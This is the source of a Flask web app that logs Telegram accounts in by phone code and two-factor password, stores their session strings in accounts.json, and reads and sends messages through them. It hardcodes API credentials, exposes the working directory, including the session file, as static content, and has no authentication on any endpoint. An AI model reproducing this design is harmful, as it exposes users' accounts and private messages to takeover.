from flask import Flask, send_file, jsonify, request, render_template_string
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
import json
import os
import asyncio
import logging
import time
import traceback

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize Flask app - IMPORTANT: template_folder is current directory
app = Flask(__name__, template_folder='.', static_folder='.', static_url_path='')
CORS(app)

# Your API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
temp_sessions = {}

# Simple async runner that won't cause issues
def run_sync(coro):
    """Run async coroutine synchronously"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(coro)
    except Exception as e:
        logger.error(f"Async error: {e}")
        return None
    finally:
        try:
            loop.close()
        except:
            pass

# Load accounts from file
def load_accounts():
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                data = f.read()
                if data.strip():
                    return json.loads(data)
                return []
        return []
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        return []

# Save accounts to file
def save_accounts(accounts):
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Load accounts on startup
accounts = load_accounts()
logger.info(f"Loaded {len(accounts)} accounts")

# -------------------- SIMPLE PAGE ROUTES --------------------
@app.route('/')
def home():
    """Serve login page"""
    try:
        return send_file('login.html')
    except Exception as e:
        logger.error(f"Error serving login.html: {e}")
        return "Login page not found. Please check file.", 404

@app.route('/login')
def login():
    """Serve login page"""
    try:
        return send_file('login.html')
    except Exception as e:
        return "Login page not found", 404

@app.route('/dashboard')
def dashboard():
    """Serve dashboard page"""
    try:
        return send_file('dashboard.html')
    except Exception as e:
        logger.error(f"Error serving dashboard.html: {e}")
        return "Dashboard page not found", 404

# -------------------- SIMPLE API ENDPOINTS --------------------

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Get all accounts"""
    global accounts
    accounts = load_accounts()
    
    # Format for frontend
    result = []
    for acc in accounts:
        result.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown')
        })
    
    return jsonify({'success': True, 'accounts': result})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Send verification code"""
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    # Ensure phone has + 
    if not phone.startswith('+'):
        phone = '+' + phone
    
    logger.info(f"Sending code to {phone}")
    
    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_sync(send_code())
        return jsonify(result if result else {'success': False, 'error': 'Unknown error'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and add account"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    phone = session_data['phone']
    phone_hash = session_data['hash']
    session_str = session_data['session']
    
    async def verify():
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        try:
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_hash)
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Create account
            new_account = {
                'id': int(time.time()),
                'phone': me.phone or phone,
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            global accounts
            accounts = load_accounts()
            accounts.append(new_account)
            save_accounts(accounts)
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_sync(verify())
        
        # Clean up temp session
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result if result else {'success': False, 'error': 'Unknown error'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get chats and messages"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    # Find account
    accounts = load_accounts()
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_str = account.get('session')
    if not session_str:
        return jsonify({'success': False, 'error': 'No session'})
    
    async def fetch():
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            dialogs = await client.get_dialogs()
            
            chats = []
            messages = []
            
            for dialog in dialogs[:50]:  # Limit to 50 chats
                if not dialog or not dialog.entity:
                    continue
                
                # Chat type
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                # Chat ID
                chat_id = str(dialog.id)
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    chat_id = f"@{dialog.entity.username}"
                
                # Last message
                last_msg = ''
                last_date = 0
                if dialog.message:
                    if dialog.message.text:
                        last_msg = dialog.message.text[:50]
                    elif dialog.message.media:
                        last_msg = '📎 Media'
                    if dialog.message.date:
                        last_date = int(dialog.message.date.timestamp())
                
                chats.append({
                    'id': chat_id,
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': last_msg,
                    'lastMessageDate': last_date
                })
                
                # Get last 10 messages
                try:
                    msgs = await client.get_messages(dialog.entity, limit=10)
                    for msg in msgs:
                        if msg:
                            msg_text = msg.text or ''
                            if msg.media:
                                if isinstance(msg.media, MessageMediaPhoto):
                                    msg_text = '📷 Photo'
                                elif isinstance(msg.media, MessageMediaDocument):
                                    msg_text = '📎 Document'
                            
                            msg_date = 0
                            if msg.date:
                                msg_date = int(msg.date.timestamp())
                            
                            messages.append({
                                'chatId': chat_id,
                                'text': msg_text,
                                'date': msg_date,
                                'out': msg.out or False,
                                'id': msg.id,
                                'hasMedia': msg.media is not None
                            })
                except:
                    continue
            
            return {
                'success': True,
                'chats': chats,
                'messages': messages
            }
            
        except Exception as e:
            logger.error(f"Fetch error: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_sync(fetch())
        return jsonify(result if result else {'success': False, 'error': 'Failed to fetch'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    """Send a message"""
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing data'})
    
    # Find account
    accounts = load_accounts()
    account = None
    for acc in accounts:
        if acc['id'] == account_id:
            account = acc
            break
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    session_str = account.get('session')
    if not session_str:
        return jsonify({'success': False, 'error': 'No session'})
    
    async def send():
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'Not authorized'}
            
            # Get entity
            try:
                if chat_id.startswith('-100'):
                    entity = await client.get_entity(int(chat_id))
                elif chat_id.startswith('@'):
                    entity = await client.get_entity(chat_id)
                else:
                    try:
                        entity = await client.get_entity(int(chat_id))
                    except:
                        entity = await client.get_entity(chat_id)
            except:
                return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            logger.error(f"Send error: {e}")
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_sync(send())
        return jsonify(result if result else {'success': False, 'error': 'Failed to send'})
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    accounts = load_accounts()
    original_len = len(accounts)
    
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts(accounts)
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'ok',
        'accounts': len(load_accounts()),
        'temp_sessions': len(temp_sessions),
        'files': {
            'login.html': os.path.exists('login.html'),
            'dashboard.html': os.path.exists('dashboard.html')
        }
    })

# Error handler
@app.errorhandler(404)
def not_found(e):
    return send_file('login.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print('\n' + '='*50)
    print('TELEGRAM MANAGER STARTING...')
    print('='*50)
    print(f'Port: {port}')
    print(f'Accounts: {len(accounts)}')
    print(f'Login.html exists: {os.path.exists("login.html")}')
    print(f'Dashboard.html exists: {os.path.exists("dashboard.html")}')
    print('='*50 + '\n')
    
    app.run(host='0.0.0.0', port=port, debug=False)
